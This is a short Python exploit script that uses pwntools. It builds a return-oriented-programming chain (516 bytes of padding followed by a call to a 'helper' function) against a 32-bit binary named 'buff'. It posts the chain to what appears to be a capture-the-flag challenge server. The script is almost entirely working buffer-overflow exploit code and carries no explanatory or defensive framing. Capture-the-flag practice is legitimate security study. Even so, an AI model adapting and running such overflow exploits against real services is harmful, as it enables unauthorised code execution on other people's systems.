from urllib.parse import urlencode

from pwnlib.context import context
from pwnlib.elf.elf import ELF
from pwnlib.rop.rop import ROP
from pwnlib.tubes.process import process
from pwnlib.util.fiddling import enhex

context.clear(arch="i386")

binary = ELF("buff")

rop = ROP(binary)
rop.find_gadget("ret")
rop.raw(b'a'*516)
rop.call('helper')
#print(rop.dump())
raw_rop = rop.chain()
#print(enhex(raw_rop))



# p = process(binary.path)
# p.send(raw_rop)
# print(repr(p.recvall(timeout=5)))
#
# exitcode = p.poll(block=False)
# print("process exitcode:" + str(exitcode))

import requests

headers = {"Content-Type": "application/x-www-form-urlencoded", "Accept": "*"}
payload = {"message": raw_rop}
urlencode(payload)

resp = requests.post("https://r0.nzcsc.org.nz/challenge5/", headers=headers, data=payload)
print(resp.text)